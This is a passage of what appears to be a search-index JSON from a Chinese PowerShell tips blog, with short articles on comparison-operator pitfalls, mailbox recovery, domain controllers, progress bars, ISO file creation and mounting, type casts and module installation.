最显著的区别在于 PermissionSDDL 属性。","link":"/2023/04/13/richer-printer-information/"},{"title":"PowerShell 技能连载 - PowerShell 废弃功能（第 2 部分：Exchange Online 中的远程 PowerShell (RPS)）","text":"Exchange Online 中的 PowerShell cmdlet 使用“远程 PowerShell”作为远程技术，这是一种在今天世界中存在安全风险的传统技术。这就是为什么 Exchange 团队最初考虑在2023年6月停用 Remote PowerShell。 由于相当多的用户似乎无法切换到新的、更安全的基于 REST 的 v3 PowerShell 模块来管理 Exchange，团队决定添加一种方法让客户重新启用 Remote PowerShell 以延长宽限期（至少适用于 Microsoft 云租户）。 简而言之：如果您仍在使用 Exchange Online 中的 Remote PowerShell，则需要开始计划过渡到基于 REST 的 v3 PowerShell 模块。","link":"/2023/04/19/powershell-deprecations-part-2-remote-powershell-rps-in-exchange-online/"},{"title":"PowerShell 技能连载 - 常见陷阱和奇怪结果：比较运算符","text":"你能发现下面代码中的错误吗？ 12345678910$result = 'NO'if ($result = 'YES'){ 'Result: YES'}else{ 'Result: NO'} 无论 $result 包含“NO”还是“YES”，它总是返回“Result: YES”。 从其他脚本或编程语言转换到 PowerShell 的人经常遇到这个错误：在 PowerShell 中，“=”是一个独占赋值运算符，而对于比较，您需要使用“-eq”。因此，正确的代码（和简单的修复）应该是这样的： 12345678910$result = 'NO'if ($result -eq 'YES'){ 'Result: YES'}else{ 'Result: NO'} 让我们看一下为什么最初的代码总是返回“Result: YES”。 当您意外使用赋值运算符而不是比较运算符时，您将不会得到任何结果，因此这个 NULL 值应该真正评估为 $false，并且条件应该始终返回“Result: NO”。然而，情况恰恰相反。 这是由于另一个PowerShell鲜为人知的怪异之处：当您分配一个值并将分配放在大括号中时，分配也将被返回。最初错误的代码将使用实际响应于赋值值的条件。 每当您向$result（所有都被解释为FALSE）分配0、’’、$false 或 $null 时，代码都会返回“Result: NO”。任何其他赋值都会返回“Result: YES”。 所有这些令人困惑的行为只是因为用户肌肉记忆使用了操作符“=”而实际上需要“-eq”操作符。","link":"/2023/04/21/common-pitfall-and-strange-results-comparison-operator/"},{"title":"PowerShell 技能连载 - 重命名属性（简单方法）","text":"Select-Object 不仅可以选择属性，还可以重命名。假设您需要获取一个文件夹中的文件列表，并包含文件大小信息，这行代码就足够了： 12PS&gt; Get-ChildItem -Path c:\\windows -File | Select-Object -Property Length, FullName} 现在你只能看到两个选定的属性“Length”和“FullName”。但是如果您希望此信息以不同的名称显示，例如“Size”和“Path”，该怎么办？ 只需通过提交每个属性的哈希表来重命名属性。在每个哈希表内，使用“Name”键来重命名属性，“Expression = '[OriginalPropertyName]' }”键保持原始属性内容不变： 1Get-ChildItem -Path c:\\windows -File | Select-Object -Property @{Name='Size';Expression='Length'}, @{Name='Path';Expression='FullName'} 这样，您可以轻松地重命名任何对象中的任何属性。","link":"/2023/04/25/renaming-properties-simple/"},{"title":"PowerShell 技能连载 - Office365邮箱恢复删除（第 1 部分）","text":"如果您已删除 Office365 用户帐户，但后来意识到仍需要其邮箱中的数据，则可能可以恢复该邮箱。 首先，请检查邮箱是否已“软删除”。下一个命令列出了所有可恢复的邮箱： 1Get-Mailbox -SoftDeletedMailbox | Select UserPrincipalName, WhenSoftDeleted 每个邮箱都与用户主体名称相关联。要取消删除邮箱，您需要临时重新创建此帐户。接下来，您可以撤消邮件箱的删除操作。只需在以下命令中替换主体名称即可： 1Undo-SoftDeletedMailbox -SoftDeletedObject username@company.onmicrosoft.com","link":"/2023/04/27/undeleting-office365-mailboxes-part-1/"},{"title":"PowerShell 技能连载 - 列出所有域控制器","text":"要快速获取所有域控制器的列表，请运行以下命令： 1Get-AdDomainController -Filter * | Select-Object -Property Name, Domain, Forest, IPv4Address, Site | Export-Csv -Path $env:temp\\report.csv -UseCulture -NoTypeInformation -Encoding Default 当然，您需要登录到域，并且需要访问“ActiveDirectory” PowerShell 模块。 该命令会在您的临时文件夹中创建一个 CSV 文件，可用 Excel 打开。只需双击创建的 CSV 文件即可。“-UseCulture”确保CSV使用正确的分隔符以便 Excel 打开它。","link":"/2023/05/01/listing-all-domain-controllers/"},{"title":"PowerShell 技能连载 - 永久删除硬盘内容","text":"当您在硬盘驱动器或USB闪存等存储介质上删除文件时，如您所知，数据并不会立即被删除。相反，数据只是未分配的，并将根据需要被新数据覆盖。在此之前，任何人都可以恢复已删除的数据。 为了防止对已删除的数据进行访问，在Windows上可以使用内置工具 cipher.exe 显式地覆盖所有未分配的存储空间。当您这样做时，您会立即意识到为什么默认情况下不这样做：即使是所有零位数也需要很长时间才能将数据存储到介质中。 该命令三次覆盖C:\\驱动器上未分配的存储空间，首先用“0”、然后用“1”，最后用随机值。你最好投入一晚完成这个任务： 1cipher /w:C:\\ 以下是我们示例中使用的“/w”开关的官方描述：“从整个卷中可用未使用磁盘空间中移除数据。如果选择此选项，则忽略所有其他选项。指定目录可以位于本地卷中任何位置。如果它是一个挂载点或指向另一个卷中目录，则将删除该卷上的数据。","link":"/2023/05/01/permanently-deleting-hard-drive-content/"},{"title":"PowerShell 技能连载 - Office365邮箱恢复删除（第 2 部分）","text":"假设有人离开了公司，您删除了其Office365用户帐户。事实证明，这也会删除附加的邮箱。如果您想将此邮箱附加到其他人身上，即仍然能够访问重要的公司或客户数据，则可以按照以下步骤操作。 首先，请检查邮箱是否已“软删除”并且仍然可以恢复： 1Get-Mailbox -SoftDeletedMailbox | Select-Object Name,ExchangeGUID 此列表中每个可恢复的邮箱都具有唯一的GUID。要将此邮箱附加到其他人身上，还需要找出要将已删除的邮箱附加到其中的仍处于活动状态的邮箱的GUID： 1$liveMailbox = Get-Mailbox existingPerson@somecompany.onmicrosoft.com | Select-Object Name,ExchangeGUID 接下来，在获取两个GUID后，发出请求以将旧邮件箱数据连接到新邮件箱，并指定目标根文件夹（例如“旧邮件内容”）。这将是新邮件箱显示在其下面的电子邮件文件夹： 1New-MailboxRestoreRequest -SourceMailbox [ENTER_GUID_OF_SOFTDELETED_MAILBOX] -TargetMailbox $liveMailbox.ExchangeGUID -AllowLegacyDNMismatch -TargetRootFolder &quot;Old Mailbox Content","link":"/2023/05/01/undeleting-office365-mailboxes-part-2/"},{"title":"PowerShell 技能连载 - 彻底删除硬盘数据","text":"当您在硬盘驱动器或USB闪存等存储介质上删除文件时，如您所知，数据并不会立即被删除。相反，数据只是未分配的，并将根据需要被新数据覆盖。在此之前，任何人都可以恢复已删除的数据。 为了防止对已删除的数据进行访问，在 Windows 上可以使用内置工具 cipher.exe 显式地覆盖所有未分配的存储空间。当您这样做时，您会立即意识到为什么默认情况下不这样做：即使是所有零位的数据也需要很长时间才能存储到介质中。 该命令将三次覆盖 C:\\ 驱动器上未分配的存储空间，首先用 “0”、然后用 “1”，最后用随机值。可能需要一个晚上才能完成这个任务： 1cipher /w:C:\\ 以下是我们示例中使用的 “/w“ 开关的官方描述：“从整个卷中可用未使用磁盘空间中移除数据。如果选择此选项，则忽略所有其他选项。指定目录可以位于本地卷中任何位置。如果它是一个挂载点或指向另一个卷中目录，则将删除该卷上的数据。","link":"/2023/05/03/permanently-deleting-hard-drive-content/"},{"title":"PowerShell 技能连载 - 列出所有域控制器","text":"要快速获取所有域控制器的列表，请运行以下命令： 1Get-AdDomainController -Filter * | Select-Object -Property Name, Domain, Forest, IPv4Address, Site | Export-Csv -Path $env:temp\\report.csv -UseCulture -NoTypeInformation -Encoding Default 当然，您需要登录到域，并且需要访问 “ActiveDirectory” PowerShell 模块。 该命令会在您的临时文件夹中创建一个 CSV 文件，可用 Excel 打开。只需双击所创建的 CSV 文件即可。”-UseCulture“ 确保 CSV 使用正确的分隔符以便 Excel 打开它。","link":"/2023/05/05/listing-all-domain-controllers/"},{"title":"PowerShell 技能连载 - 列出活动的域控制器","text":"如果您的计算机连接到域，您可以使用 PowerShell 来识别您所连接的域控制器。可以使用以下命令： 1Get-ADDomainController -Discover 或者，简单地查找 “LOGONSERVER” 环境变量： 1$env:LOGONSERVER 它会列出您登录的计算机名称。如果它等于自己的计算机名称（不带反斜杠），则表示已本地登录而非加入域： 12345678if ($env:LOGONSERVER.TrimStart('\\') -eq $env:COMPUTERNAME){ &quot;local&quot;}else{ &quot;logged on to $env:LOGONSERVER&quot;}","link":"/2023/05/09/listing-active-domain-controller/"},{"title":"PowerShell 技能连载 - 进度条技巧（第 1 部分）","text":"PowerShell自带内置进度条。通常情况下，当脚本完成时，它会自动消失： 1234Write-Progress -Activity 'I am busy' -Status 'Step A'Start-Sleep -Seconds 2Write-Progress -Activity 'I am busy' -Status 'Step B'Start-Sleep -Seconds 2 如果您想在脚本仍在运行时关闭进度条，则需要使用“-Completed”开关参数： 1234567Write-Progress -Activity 'I am busy' -Status 'Step A'Start-Sleep -Seconds 2Write-Progress -Activity 'I am busy' -Status 'Step B'Start-Sleep -Seconds 2Write-Progress -Completed -Activity 'I am busy'Write-Host 'Progress bar closed, script still running.'Start-Sleep -Seconds 2 如您所见，关闭进度条需要同时指定“－Activity”参数，因为它是一个强制性的参数。但是，如果您只想关闭所有可见的进度条，则“－Activity”参数的值并不重要。你可以提交一个空格或数字等任何值（除了null值或空字符串），因为这些都不会被强制性参数接受。 写入以下代码以定义“－ Activity” 参数的默认值： 1234567Write-Progress -Activity 'I am busy' -Status 'Step A'Start-Sleep -Seconds 2Write-Progress -Activity 'I am busy' -Status 'Step B'Start-Sleep -Seconds 2Write-Progress -Completed -Activity ' 'Write-Host 'Progress bar closed, script still running.'Start-Sleep -Seconds 2 写入以下代码以定义 “-Activity“ 参数的默认值： 1$PSDefaultParameterValues['Write-Progress:Activity']='xyz' 现在，”Write-progress“ 将接受 “Completed“ 参数而无需提交 “Activity“ 参数： 1234567Write-Progress -Activity 'I am busy' -Status 'Step A'Start-Sleep -Seconds 2Write-Progress -Activity 'I am busy' -Status 'Step B'Start-Sleep -Seconds 2Write-Progress -Completed # due to the previously defined new default value, -Activity can now be omittedWrite-Host 'Progress bar closed, script still running.'Start-Sleep -Seconds 2","link":"/2023/05/11/progress-bar-tricks-part-1/"},{"title":"PowerShell 技能连载 - 进度条技巧（第 2 部分）","text":"内置的 PowerShell 进度条支持“真实”的进度指示器，只要您提交一个在 0 到 100 范围内的“percentCompleted”值： 1234560..100 | ForEach-Object { $message = '{0:p0} done' -f ($_/100) Write-Progress -Activity 'I am busy' -Status $message -PercentComplete $_ Start-Sleep -Milliseconds 100} 为了显示一个“真实”的进度指示器，因此您的脚本需要“知道”已经处理了多少给定任务。 以下是一个修改后的示例，它定义了需要处理多少个任务，然后从中计算出完成百分比： 123456789101112131415$data = Get-Service # for illustration, let's assume you want to process all services$counter = 0$maximum = $data.Count # number of items to be processed$data | ForEach-Object { # increment counter $counter++ $percentCompleted = $counter * 100 / $maximum $message = '{0:p1} done, processing {1}' -f ($percentCompleted/100), $_.DisplayName Write-Progress -Activity 'I am busy' -Status $message -PercentComplete $percentCompleted Write-Host $message Start-Sleep -Milliseconds 100}","link":"/2023/05/13/progress-bar-tricks-part-2/"},{"title":"PowerShell 技能连载 - 进度条技巧（第 3 部分）","text":"PowerShell 内置的进度条可以嵌套，每个任务显示一个进度条。为了使其正常工作，请为您的进度条分配不同的 ID 号码： 123456789101112131415$servers = 'dc-01', 'dc-02', 'msv3', 'msv4'$ports = 80, 445, 5985$servers | ForEach-Object { $server = $_ Write-Progress -Activity 'Checking Servers' -Status $server -Id 1 $ports | ForEach-Object { $port = $_ Write-Progress -Activity 'Checking Port' -Status $port -Id 2 # here would be your code that performs some task, i.e. a port test: Start-Sleep -Seconds 1 }}","link":"/2023/05/17/progress-bar-tricks-part-3/"},{"title":"PowerShell 技能连载 - 进度条技巧（第 4 部分）","text":"由于广大用户的要求，这里提供了一段代码，演示如何使用嵌套进度条并显示每个任务的“真实”进度指示器： 1234567891011121314151617181920212223242526$servers = 'dc-01', 'dc-02', 'msv3', 'msv4'$ports = 80, 445, 5985$counterServers = 0$servers | ForEach-Object { # increment server counter and calculate progress $counterServers++ $percentServers = $counterServers * 100 / $servers.Count $server = $_ Write-Progress -Activity 'Checking Servers' -Status $server -Id 1 -PercentComplete $percentServers $counterPorts = 0 $ports | ForEach-Object { # increment port counter and calculate progress $counterPorts++ $percentPorts = $counterPorts * 100 / $ports.Count $port = $_ Write-Progress -Activity 'Checking Port' -Status $port -Id 2 -PercentComplete $percentPorts # here would be your code that performs some task, i.e. a port test: Start-Sleep -Seconds 1 }}","link":"/2023/05/19/progress-bar-tricks-part-4/"},{"title":"PowerShell 技能连载 - PowerShell 废弃功能 (第 1 部分：PowerShell 2.0)","text":"Windows PowerShell 2.0 仍然是任何 Windows PowerShell 的一部分，用于向后兼容。当启用时，它是一个严重的安全风险 - PowerShell 2.0 简单地没有 PowerShell 5 及更高版本中发现的所有先进恶意软件检测工具。 如果您拥有管理员权限，则此行将告诉您系统上是否启用了 PowerShell 2.0： 1PS&gt; Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 如果它已启用，请确保将其禁用。","link":"/2023/04/17/powershell-deprecations-part-1-powershell-2-0/"},{"title":"PowerShell 技能连载 - 创建 ISO 文件","text":"PowerShell 可以将普通文件夹转换为 ISO 文件。ISO 文件是二进制文件，可以被挂载并表现得像只读 CD-ROM 驱动器。 过去，ISO 文件常用于挂载安装媒体。如今，您可以轻松地创建自己的 ISO 文件，这些文件是从您自己的文件夹和文件中创建的。这样，您可以创建一个简单的备份系统，或者轻松地在同事之间共享项目。由于 ISO 文件只是一个单一的文件，因此可以轻松地共享，而且由于 Windows 通过双击挂载它们，并在 Windows 资源管理器中显示它们作为 CD-ROM 驱动器，您可以立即使用数据而无需提取或解压任何内容。 与 VHD 映像文件不同，挂载 ISO 文件不需要管理员特权。任何人都可以挂载和使用 ISO 文件。 由于没有内置的 cmdlet 将文件夹结构转换为 ISO 文件，您需要自己调用内部 API。下面的代码定义了新函数 New-IsoFile： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108function New-IsoFile{ param ( # path to local folder to store in # new ISO file (must exist) [Parameter(Mandatory)] [String] $SourceFilePath, # name of new ISO image (arbitrary, # turns later into drive label) [String] $ImageName = 'MyCDROM', # path to ISO file to be created [Parameter(Mandatory)] [String] $NewIsoFilePath, # if specified, the source base folder is # included into the image file [switch] $IncludeRoot ) # use this COM object to create the ISO file: $fsi = New-Object -ComObject IMAPI2FS.MsftFileSystemImage # use this helper object to write a COM stream to a file: # compile the helper code using these parameters: $cp = [CodeDom.Compiler.CompilerParameters]::new() $cp.CompilerOptions = '/unsafe' $cp.WarningLevel = 4 $cp.TreatWarningsAsErrors = $true $code = ' using System; using System.IO; using System.Runtime.InteropServices.ComTypes; namespace CustomConverter { public static class Helper { // writes a stream that came from COM to a filesystem file public static void WriteStreamToFile(object stream, string filePath) { // open output stream to new file IStream inputStream = stream as IStream; FileStream outputFileStream = File.OpenWrite(filePath); int bytesRead = 0; byte[] data; // read stream in chunks of 2048 bytes and write to filesystem stream: do { data = Read(inputStream, 2048, out bytesRead); outputFileStream.Write(data, 0, bytesRead); } while (bytesRead == 2048); outputFileStream.Flush(); outputFileStream.Close(); } // read bytes from stream: unsafe static private byte[] Read(IStream stream, int byteCount, out int readCount) { // create a new buffer to hold the read bytes: byte[] buffer = new byte[byteCount]; // provide a pointer to the location where the actually read bytes are reported: int bytesRead = 0; int* ptr = &amp;bytesRead; // do the read: stream.Read(buffer, byteCount, (IntPtr)ptr); // return the read bytes by reference to the caller: readCount = bytesRead; // return the read bytes to the caller: return buffer; } } }' Add-Type -CompilerParameters $cp -TypeDefinition $code # define the ISO file properties: # create CDROM, Joliet and UDF file systems $fsi.FileSystemsToCreate = 7 $fsi.VolumeName = $ImageName # allow larger-than-CRRom-Sizes $fsi.FreeMediaBlocks = -1 $msg = 'Creating ISO File - this can take a couple of minutes.' Write-Host $msg -ForegroundColor Green # define folder structure to be written to image: $fsi.Root.AddTreeWithNamedStreams($SourceFilePath,$IncludeRoot.IsPresent) # create image and provide a stream to read it: $resultimage = $fsi.CreateResultImage() $resultStream = $resultimage.ImageStream # write stream to file [CustomConverter.Helper]::WriteStreamToFile($resultStream, $NewIsoFilePath) Write-Host 'DONE.' -ForegroundColor Green} 运行此代码后，您现在将拥有一个名为“New-IsoFile”的新命令。从现有文件夹结构创建ISO文件现在变得轻而易举 - 只需确保源文件路径存在即可： 1PS&gt; New-IsoFile -NewIsoFilePath $env:temp\\MyTest.iso -ImageName Holiday -SourceFilePath 'C:\\HolidayPics' 您将在临时文件夹（或您指定的其他文件路径）中获得一个新的 ISO 文件。如果您按照示例操作，只需打开临时文件夹： 1PS&gt; explorer /select,$env:temp\\MyTest.iso 当你在Windows资源管理器中双击ISO文件时，该映像将作为一个新的光驱挂载，你可以立即看到映像文件中存储的数据的副本。 在Windows资源管理器中右键单击新的光驱，并从上下文菜单中选择“弹出”将卸载该光驱。","link":"/2023/05/23/creating-iso-files/"},{"title":"PowerShell 技能连载 - 挂载 ISO 文件","text":"在我们之前的提示中，我们展示了如何轻松将本地文件夹转换为 ISO 文件镜像。今天，我们来看一下如何挂载（以及卸载）您自己和其他任何 ISO 文件，以便它们可以像本地文件系统驱动器一样使用。 挂载 ISO 文件很简单： 1234# 确保您调整此路径，使其指向现有的ISO文件：$Path = &quot;$env:temp\\myImageFile.iso&quot;$result = Mount-DiskImage -ImagePath $Path -PassThru$result 执行此代码后，Windows 资源管理器中会出现一个新的光驱，可以像其他驱动器一样使用。基于 ISO 镜像的驱动器当然是只读的，因为它们的行为就像常规的 CD-ROM。 虽然 Mount-DiskImage 可以成功挂载 ISO 镜像，但它不会将分配的驱动器字母返回给您。如果您想从脚本内部访问 ISO 镜像的内容，下面是如何找出它分配的驱动器字母： 123456789# 确保您调整此路径，使其指向现有的ISO文件：$Path = &quot;$env:temp\\myImageFile.iso&quot;$result = Mount-DiskImage -ImagePath $Path -PassThru$result$volume = $result | Get-Volume$letter = $volume.Driveletter + &quot;:\\&quot;explorer $letter 在使用后卸载驱动器，请运行 Dismount-DiskImage 并指定您之前挂载的ISO文件的路径： 1Dismount-DiskImage -ImagePath $Path","link":"/2023/05/25/mounting-iso-files/"},{"title":"PowerShell 技能连载 - 两种类型转换（和一个 bug）","text":"为了明确将一个数据类型转换为另一个数据类型，PowerShell提供了两种方法： 12345PS&gt; [int]5.66PS&gt; 5.6 -as [int]6 虽然这两种方法在大多数情况下都会产生相同的结果，但存在细微差异： 当你在数据之前添加目标类型时，PowerShell 使用美国文化，并在转换失败时引发异常。 当你使用 “-as“ 运算符时，PowerShell 使用你的本地文化，在转换失败时不引发异常。 当你在非英语系统上进行字符串到日期时间的转换时，不同的文化变得重要： 1234567PS&gt; [datetime]'1.5.23'Donnerstag, 5. Januar 2023 00:00:00PS&gt; '1.5.23' -as [datetime]Montag, 1. Mai 2023 00:00:00 最后，这两种方法都存在一个奇怪的错误，即使输入的字符串明显损坏，类型转换仍然有效： PS&gt; [Type] ‘int]whatever’ IsPublic IsSerial Name BaseType True True Int32 System.ValueType PS&gt; ‘int]whatever’ -as [Type] IsPublic IsSerial Name BaseType True True Int32 System.ValueType 不过，不要利用这个错误，因为在 PowerShell 7 中很快会修复它。","link":"/2023/05/29/two-type-casts-and-one-bug/"},{"title":"PowerShell 技能连载 - Invoke-RestMethod 退出错误","text":"无论是 Invoke-WebRequest 还是 Invoke-RestMethod，都是简单易用的命令，用于从网络上下载信息。例如，以下简单代码可以查询任何公共 IP 地址的注册信息并返回其注册所有者： 123456789101112$IPAddress = '51.107.59.180'Invoke-RestMethod -Uri &quot;http://ipinfo.io/$IPAddress/json&quot; -UseBasicParsingip : 51.107.59.180city : Zürichregion : Zurichcountry : CHloc : 47.3667,8.5500org : AS8075 Microsoft Corporationpostal : 8090timezone : Europe/Zurichreadme : https://ipinfo.io/missingauth 如果在你的代码与互联网通信时出现问题，在 Windows PowerShell 中有一个硬编码的超时时间为 300 秒。因此，即使你的路由器出现故障，你的 PowerShell 脚本最终也会返回。 在 PowerShell 7 中，这两个命令的内部工作方式发生了重大改变。它们目前不再具有连接超时功能，因此如果你的连接中断，你的脚本将永远挂起。 幸运的是，这个错误目前正在解决中，并将在即将推出的 PowerShell 7 更新中修复。","link":"/2023/05/31/invoke-restmethod-cancellation-issues/"},{"title":"PowerShell 技能连载 - SpeculationControl：使用 PowerShell 检查风险","text":"微软几年前发布了一个模块（最近 3 周更新），您可以使用该模块来检测您的硬件是否容易受到 Spectre 和 Meltdown 威胁的攻击。要尝试这个功能，请从 PowerShell Gallery 安装该模块： 1Install-Module -Name SpeculationControl -Scope CurrentUser 要运行测试套件并查看结果，请输入以下命令： 1PS&gt; Get-SpeculationControlSettings 这将显示您的计算机的测试结果，可能类似于以下内容： For more information about the output below, please refer to https://support.microsoft.com/help/4074629 Speculation control settings for CVE-2017-5715 [branch target injection] Hardware support for branch target injection mitigation is present: True Windows OS support for branch target injection mitigation is present: True Windows OS support for branch target injection mitigation is enabled: True Speculation control settings for CVE-2017-5754 [rogue data cache load] Hardware is vulnerable to rogue data cache load: False Hardware requires kernel VA shadowing: False Speculation control settings for CVE-2018-3639 [speculative store bypass] Hardware is vulnerable to speculative store bypass: True Hardware support for speculative store bypass disable is present: True Windows OS support for speculative store bypass disable is present: True Windows OS support for speculative store bypass disable is enabled system-wide: False Speculation control settings for CVE-2018-3620 [L1 terminal fault] Hardware is vulnerable to L1 terminal fault: False Speculation control settings for MDS [microarchitectural data sampling] Windows OS support for MDS mitigation is present: True Hardware is vulnerable to MDS: False Speculation control settings for SBDR [shared buffers data read] Windows OS support for SBDR mitigation is present: True Hardware is vulnerable to SBDR: True Windows OS support for SBDR mitigation is enabled: False Speculation control settings for FBSDP [fill buffer stale data propagator] Windows OS support for FBSDP mitigation is present: True Hardware is vulnerable to FBSDP: True Windows OS support for FBSDP mitigation is enabled: False Speculation control settings for PSDP [primary stale data propagator] Windows OS support for PSDP mitigation is present: True Hardware is vulnerable to PSDP: True Windows OS support for PSDP mitigation is enabled: False Suggested actions * Follow the guidance for enabling Windows Client support for speculation control mitigations described in https://support.microsoft.com/help/4073119 BTIHardwarePresent : True BTIWindowsSupportPresent : True BTIWindowsSupportEnabled : True BTIDisabledBySystemPolicy : False BTIDisabledByNoHardwareSupport : False BTIKernelRetpolineEnabled : False BTIKernelImportOptimizationEnabled : True RdclHardwareProtectedReported : True RdclHardwareProtected : True KVAShadowRequired : False KVAShadowWindowsSupportPresent : True KVAShadowWindowsSupportEnabled : False KVAShadowPcidEnabled : False SSBDWindowsSupportPresent : True SSBDHardwareVulnerable : True SSBDHardwarePresent : True SSBDWindowsSupportEnabledSystemWide : False L1TFHardwareVulnerable : False L1TFWindowsSupportPresent : True L1TFWindowsSupportEnabled : False L1TFInvalidPteBit : 0 L1DFlushSupported : True HvL1tfStatusAvailable : True HvL1tfProcessorNotAffected : True MDSWindowsSupportPresent : True MDSHardwareVulnerable : False MDSWindowsSupportEnabled : False FBClearWindowsSupportPresent : True SBDRSSDPHardwareVulnerable : True FBSDPHardwareVulnerable : True PSDPHardwareVulnerable : True FBClearWindowsSupportEnabled : False PS&gt;","link":"/2023/06/06/speculationcontrol-use-powershell-to-check-for-risks/"},{"title":"PowerShell 技能连载 - 获取父级文化","text":"大部分情况下，本地化资源都会标有类似 “en-us” 或 “de-de” 这样的文化名称。如果你想知道这种标识代表什么，只需将其转换为 [System.Globalization.CultureInfo] 对象： 12345678910111213PS&gt; [System.Globalization.CultureInfo]'en-us'LCID Name DisplayName---- ---- -----------1033 en-US English (United States)PS&gt; [System.Globalization.CultureInfo]'de-de'LCID Name DisplayName---- ---- -----------1031 de-DE German (Germany) 正如你所见，文化名称非常细致。例如，有 106 个子文化都属于同一个英语基础文化： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110PS&gt; [System.Globalization.CultureInfo]::GetCultures( [System.Globalization.CultureTypes]::AllCultures) | Where-Object Parent -eq 'en'LCID Name DisplayName---- ---- -----------4096 en-001 English (World)9225 en-029 English (Caribbean)4096 en-150 English (Europe)19465 en-AE English (United Arab Emirates)4096 en-AG English (Antigua and Barbuda)4096 en-AI English (Anguilla)4096 en-AS English (American Samoa)4096 en-AT English (Austria)3081 en-AU English (Australia)4096 en-BB English (Barbados)4096 en-BE English (Belgium)4096 en-BI English (Burundi)4096 en-BM English (Bermuda)4096 en-BS English (Bahamas)4096 en-BW English (Botswana)10249 en-BZ English (Belize)4105 en-CA English (Canada)4096 en-CC English (Cocos [Keeling] Islands)4096 en-CH English (Switzerland)4096 en-CK English (Cook Islands)4096 en-CM English (Cameroon)4096 en-CX English (Christmas Island)4096 en-CY English (Cyprus)4096 en-DE English (Germany)4096 en-DK English (Denmark)4096 en-DM English (Dominica)4096 en-ER English (Eritrea)4096 en-FI English (Finland)4096 en-FJ English (Fiji)4096 en-FK English (Falkland Islands)4096 en-FM English (Micronesia)2057 en-GB English (United Kingdom)4096 en-GD English (Grenada)4096 en-GG English (Guernsey)4096 en-GH English (Ghana)4096 en-GI English (Gibraltar)4096 en-GM English (Gambia)4096 en-GU English (Guam)4096 en-GY English (Guyana)15369 en-HK English (Hong Kong SAR)14345 en-ID English (Indonesia)6153 en-IE English (Ireland)4096 en-IL English (Israel)4096 en-IM English (Isle of Man)16393 en-IN English (India)4096 en-IO English (British Indian Ocean Territory)4096 en-JE English (Jersey)8201 en-JM English (Jamaica)4096 en-KE English (Kenya)4096 en-KI English (Kiribati)4096 en-KN English (Saint Kitts and Nevis)4096 en-KY English (Cayman Islands)4096 en-LC English (Saint Lucia)4096 en-LR English (Liberia)4096 en-LS English (Lesotho)4096 en-MG English (Madagascar)4096 en-MH English (Marshall Islands)4096 en-MO English (Macao SAR)4096 en-MP English (Northern Mariana Islands)4096 en-MS English (Montserrat)4096 en-MT English (Malta)4096 en-MU English (Mauritius)4096 en-MW English (Malawi)17417 en-MY English (Malaysia)4096 en-NA English (Namibia)4096 en-NF English (Norfolk Island)4096 en-NG English (Nigeria)4096 en-NL English (Netherlands)4096 en-NR English (Nauru)4096 en-NU English (Niue)5129 en-NZ English (New Zealand)4096 en-PG English (Papua New Guinea)13321 en-PH English (Republic of the Philippines)4096 en-PK English (Pakistan)4096 en-PN English (Pitcairn Islands)4096 en-PR English (Puerto Rico)4096 en-PW English (Palau)4096 en-RW English (Rwanda)4096 en-SB English (Solomon Islands)4096 en-SC English (Seychelles)4096 en-SD English (Sudan)4096 en-SE English (Sweden)18441 en-SG English (Singapore)4096 en-SH English (St Helena, Ascension, Tristan da Cunha)4096 en-SI English (Slovenia)4096 en-SL English (Sierra Leone)4096 en-SS English (South Sudan)4096 en-SX English (Sint Maarten)4096 en-SZ English (Swaziland)4096 en-TC English (Turks and Caicos Islands)4096 en-TK English (Tokelau)4096 en-TO English (Tonga)11273 en-TT English (Trinidad and Tobago)4096 en-TV English (Tuvalu)4096 en-TZ English (Tanzania)4096 en-UG English (Uganda)4096 en-UM English (US Minor Outlying Islands)1033 en-US English (United States)4096 en-VC English (Saint Vincent and the Grenadines)4096 en-VG English (British Virgin Islands)4096 en-VI English (US Virgin Islands)4096 en-VU English (Vanuatu)4096 en-WS English (Samoa)7177 en-ZA English (South Africa)4096 en-ZM English (Zambia)12297 en-ZW English (Zimbabwe) 如果您的代码最终需要检查给定的资源区域设置是否与您的兴趣相匹配，而不是将资源区域设置与您的用户界面区域设置进行比较，您可能希望获取您的用户界面区域设置和资源的父级区域设置，并查看它们是否匹配。 这样，英国用户（en-GB）也将找到美国的文档（en-us）。同样，瑞士用户（de-ch）将找到德国的资源（de-de）。","link":"/2023/06/02/getting-parent-culture/"},{"title":"PowerShell 技能连载 - 测试驱动 PowerShellGet 版本 3","text":"PowerShellGet 是一个模块，包含重要的 cmdlet，比如 Install-Module，因此该模块实际上是下载和安装其他模块的先决条件，即从 powershellgallery.com 下载和安装模块的先决条件。 终于，期待已久的第 3 版该模块作为预览版在 PowerShell Gallery 中可用，有很多理由说明你应该使用这个新版本。 以下是安装步骤： 1PS&gt; Install-Module -Name PowerShellGet -AllowPrerelease -Scope CurrentUser 你应该更新的一个原因是，你可能再也无法这样做了。很可能你的 Install-Module cmdlet 缺少 -AllowPrerelease 参数，因此无法安装任何预发布模块。对于任何使用语义版本的现代模块都是如此。 悲伤的事实是，PowerShellGet 在 Windows 10/11 映像中的初始版本 1.0.0.1 中被包含进去，并且从那时起从未自动更新。版本 1.0.0.1 现在已经过时，无法在许多情况下正常工作。 为了解决这个问题，你应该先手动强制安装 PowerShellGet 2.x。这将安装你安装 PowerShellGet 3.x 所需的先决条件： 1PS&gt; Install-Module -Name PowerShellGet -Scope CurrentUser -Force -AllowClobber 运行这行命令并重新启动 PowerShell 后，Install-Module 应该具有 -AllowPrelease 参数，因此现在你可以运行第一个代码行并安装 PowerShellGet 3.x。 最终，PowerShellGet 3 版将希望解决所有这些问题，并为 PowerShell 的模块交换机制提供更强大的支持。","link":"/2023/06/08/test-driving-powershellget-version-3/"},{"title":"PowerShell 技能连载 - 选择最适当的文件格式（第 1 部分）","text":"PowerShell支持各种文本文件格式，那么保存和读取数据的最佳方法是什么呢？ 这主要取决于数据的类型，下面是实际指南的第一部分： 一维数据：当数据只有一个维度，例如服务器名称列表时，最好将其保存为纯文本文件。首选的命令是使用“Content”名词的命令：Get-Content 用于读取，Set-Content 用于写入，Add-Content 用于追加。纯文本文件存储字符串数组。注意事项：在保存和读取时，需要使用相同的文本编码，因此最好使用 UTF-8 编码。注意事项＃2：如果您想将字符串数组文件内容读取到变量中，添加 -ReadCount 0 参数。这比默认方式快很多倍。 